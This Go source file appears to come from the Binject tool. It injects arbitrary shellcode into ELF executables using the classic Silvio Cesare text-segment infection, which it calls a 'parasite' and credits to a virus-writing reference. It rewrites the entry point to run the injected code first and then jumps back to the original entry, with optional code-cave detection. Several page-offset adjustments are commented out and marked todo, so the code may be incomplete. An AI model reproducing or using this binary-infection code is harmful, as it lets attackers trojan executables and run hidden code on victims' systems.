package bj

import (
	"bytes"
	"github.com/Binject/shellcode/api"
	"github.com/keyval-dev/odigos/odiglet/pkg/allocator/debug/elf"
	"log"
)

// ElfBinject - Inject shellcode into an ELF binary
func ElfBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, uint64, error) {

	elfFile, err := elf.NewFile(bytes.NewReader(sourceBytes))
	if err != nil {
		return nil, 0, err
	}

	//
	// BEGIN CODE CAVE DETECTION SECTION
	//

	if config.CodeCaveMode == true {
		log.Printf("Using Code Cave Method")
		caves, err := FindCaves(sourceBytes)
		if err != nil {
			return nil, 0, err
		}
		for _, cave := range caves {
			for _, section := range elfFile.Sections {
				if cave.Start >= section.Offset && cave.End <= (section.Size+section.Offset) &&
					cave.End-cave.Start >= uint64(MIN_CAVE_SIZE) {
					log.Printf("Cave found (start/end/size): %d / %d / %d \n", cave.Start, cave.End, cave.End-cave.Start)
				}
			}
		}
	}
	//
	// END CODE CAVE DETECTION SECTION
	//

	return StaticSilvioMethod(elfFile, shellcodeBytes)
}

func StaticSilvioMethod(elfFile *elf.File, userShellCode []byte) ([]byte, uint64, error) {
	/*
			  Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
		        6. Increase p_shoff by PAGE_SIZE in the ELF header
		        7. Patch the insertion code (parasite) to jump to the entry point (original)
		        1. Locate the text segment program header
		            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
		            -Increase p_filesz to account for the new code (parasite)
		            -Increase p_memsz to account for the new code (parasite)
		        2. For each phdr which is after the insertion (text segment)
		            -increase p_offset by PAGE_SIZE
		        3. For the last shdr in the text segment
		            -increase sh_len by the parasite length
		        4. For each shdr which is after the insertion
		            -Increase sh_offset by PAGE_SIZE
		        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
					into the file - text segment p_offset + p_filesz (original)
	*/

	//PAGE_SIZE := uint64(4096)

	scAddr := uint64(0)
	sclen := uint64(0)
	shellcode := []byte{}

	// 6. Increase p_shoff by PAGE_SIZE in the ELF header
	//elfFile.FileHeader.SHTOffset += int64(PAGE_SIZE)

	afterTextSegment := false
	for _, p := range elfFile.Progs {

		if afterTextSegment {
			//2. For each phdr which is after the insertion (text segment)
			//-increase p_offset by PAGE_SIZE

			// todo: this doesn't match the diff
			//p.Off += PAGE_SIZE
			//p.Vaddr += PAGE_SIZE
			//p.Paddr += PAGE_SIZE

		} else if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
			// 1. Locate the text segment program header
			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
			originalEntry := elfFile.FileHeader.Entry
			elfFile.FileHeader.Entry = p.Vaddr + p.Filesz

			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
			scAddr = p.Vaddr + p.Filesz
			shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntry), elfFile.ByteOrder)

			sclen = uint64(len(shellcode))
			log.Println("Shellcode Length: ", sclen)

			// -Increase p_filesz to account for the new code (parasite)
			p.Filesz += sclen
			// -Increase p_memsz to account for the new code (parasite)
			p.Memsz += sclen

			afterTextSegment = true
		}
	}

	//	3. For the last shdr in the text segment
	//sortedSections := elfFile.Sections[:]
	//sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
	for _, s := range elfFile.Sections {

		if s.Addr > scAddr {
			// 4. For each shdr which is after the insertion
			//	-Increase sh_offset by PAGE_SIZE
			//s.Offset += PAGE_SIZE
			//s.Addr += PAGE_SIZE

		} else if s.Size+s.Addr == scAddr { // assuming entry was set to (p_vaddr + p_filesz) above
			//	-increase sh_len by the parasite length
			s.Size += sclen
		}
	}

	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
	//	into the file - text segment p_offset + p_filesz (original)
	elfFile.Insertion = shellcode
	return elfFile.Bytes()
}
